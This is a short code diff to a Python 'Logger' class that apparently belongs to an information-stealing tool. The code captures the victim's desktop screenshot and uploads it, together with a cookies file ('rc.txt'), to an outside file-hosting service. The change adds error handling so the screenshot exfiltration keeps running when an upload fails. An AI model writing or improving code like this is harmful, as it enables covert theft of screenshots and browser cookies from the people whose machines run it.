@@ -194,11 +194,15 @@ class Logger():
             screen.save(os.getenv('ProgramData') + r'\desktop.jpg')
             screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
             screen.close()
-            screenshotRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
-            screenshotUploaded = f"[Desktop Image]({screenshotRaw[39:65]})"
+            try:
+                screenshotRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
+                screenshotUploaded = f"[Desktop Image]({screenshotRaw[39:65]})"
+            except:
+                screenshotUploaded = "Desktop Image: N/A"
+                pass
         except Exception as e:
             print(e)
-            screenshotUploaded = "Desktop Image: N/A"
+            
         # Cookies
         try:
             cookiesRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
